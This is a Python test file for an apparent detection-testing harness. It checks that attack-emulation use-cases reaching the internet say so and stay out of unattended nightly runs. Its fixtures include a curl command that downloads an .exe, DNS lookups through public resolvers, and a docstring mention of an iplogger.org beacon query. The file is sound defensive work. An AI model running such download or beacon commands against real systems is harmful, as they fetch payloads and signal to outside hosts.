"""Slice 9 acceptance: a use-case that reaches the internet says so, and stays out of the
unattended pool unless the operator allows it.

Green since slice 9 (2026-10-24); it was pending_test_network_class.py. The external review
(2026-10-24): `safe` covers cleanup, not egress. 37 use-cases in the registry carry a URL or a
public resolver (35 of them `safe`), among them a download of 7zr.exe from GitHub and a DNS
query to iplogger.org through 1.1.1.1.

Spec:
  schema.VALID_NETWORK = ("lab", "internet"); `network` is optional and defaults to "lab".
  lint.reaches_internet(doc) -> bool: True when any string under params carries `http://` or
    `https://` (not a `{{SERVER}}`-templated lab address) or one of the public resolvers
    1.1.1.1, 1.0.0.1, 8.8.8.8, 8.8.4.4, 9.9.9.9. A use-case for which it is True without
    `network: internet` is a lint ERROR whose text contains "network: internet".
  selector.safe_pool(usecases, allow_internet=False) excludes `network: internet`;
    select_nightly(..., allow_internet=False) passes it through; run.py --allow-internet sets it
    for --select-nightly and admits those use-cases through gate_selection (slice 8).
  Every use-case in the registry that reaches the internet declares network: internet.
"""
import glob
import json
import os
import tempfile
import unittest

import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
UC_DIR = os.path.join(HERE, "..", "usecases")
SAMPLE_EXPORT = os.path.join(HERE, "fixtures", "rules_export.sample.ndjson")
REAL_LOCK = os.path.join(UC_DIR, "_ruleid.lock.json")
RULE = "LSASS Memory Dump Creation"  # first rule of the sample export


def doc(**kw):
    d = {"id": "t/net", "title": "t", "rules": [RULE], "technique": "T1059", "tactic": "execution",
         "executor": "winrm_command", "params": {"command": "curl https://example.com/x.exe"},
         "safety": "safe"}
    d.update(kw)
    return d


class Schema(unittest.TestCase):
    def test_network_is_a_closed_set_with_lab_as_the_default(self):
        import schema
        self.assertEqual(schema.VALID_NETWORK, ("lab", "internet"))
        self.assertEqual(schema.validate_usecase(doc(network="internet"), "x"), [])
        self.assertEqual(schema.validate_usecase(doc(), "x"), [])
        self.assertTrue(any("network" in e for e in schema.validate_usecase(doc(network="wan"), "x")))


class Lint(unittest.TestCase):
    def test_reaches_internet_recognises_urls_and_public_resolvers(self):
        import lint
        self.assertTrue(lint.reaches_internet(doc()))
        self.assertTrue(lint.reaches_internet(doc(params={"command": "Resolve-DnsName -Server 1.1.1.1 -Name example.org"})))
        self.assertTrue(lint.reaches_internet(doc(params={"command": "nslookup example.org 8.8.8.8"})))
        self.assertFalse(lint.reaches_internet(doc(params={"command": "whoami"})))
        self.assertFalse(lint.reaches_internet(doc(params={"command": "curl http://{{SERVER}}:8888/file"})),
                         "the lab's own templated server is not the internet")

    def test_a_use_case_that_reaches_the_internet_must_say_so(self):
        import lint
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "execution"))
            lock = os.path.join(d, "_ruleid.lock.json")
            with open(REAL_LOCK) as f:
                entry = json.load(f)[RULE]
            with open(lock, "w") as f:
                json.dump({RULE: entry}, f)
            path = os.path.join(d, "execution", "net.yaml")
            with open(path, "w") as f:
                yaml.safe_dump(doc(), f)
            errs = [e for e in lint.lint(d, SAMPLE_EXPORT, lock, resolve=False) if "network" in e]
            self.assertTrue(errs and all("network: internet" in e for e in errs), errs)
            with open(path, "w") as f:
                yaml.safe_dump(doc(network="internet"), f)
            errs = [e for e in lint.lint(d, SAMPLE_EXPORT, lock, resolve=False) if "network" in e]
            self.assertEqual(errs, [])


class Pool(unittest.TestCase):
    def test_internet_use_cases_stay_out_of_the_unattended_pool_unless_allowed(self):
        import selector as sel
        lab = doc(id="a", params={"command": "whoami"})
        net = doc(id="b", network="internet")
        self.assertEqual([u["id"] for u in sel.safe_pool([lab, net])], ["a"])
        self.assertEqual([u["id"] for u in sel.safe_pool([lab, net], allow_internet=True)], ["a", "b"])

    def test_select_nightly_takes_the_flag(self):
        import inspect
        import selector as sel
        self.assertIn("allow_internet", inspect.signature(sel.select_nightly).parameters)


class Registry(unittest.TestCase):
    def test_every_use_case_that_reaches_the_internet_declares_it(self):
        import lint
        missing = []
        for p in sorted(glob.glob(os.path.join(UC_DIR, "*", "*.yaml"))):
            with open(p) as f:
                d = yaml.safe_load(f) or {}
            if lint.reaches_internet(d) and d.get("network") != "internet":
                missing.append(os.path.relpath(p, UC_DIR))
        self.assertEqual(missing, [], f"{len(missing)} use-case(s) reach the internet without saying so")


if __name__ == "__main__":
    unittest.main()
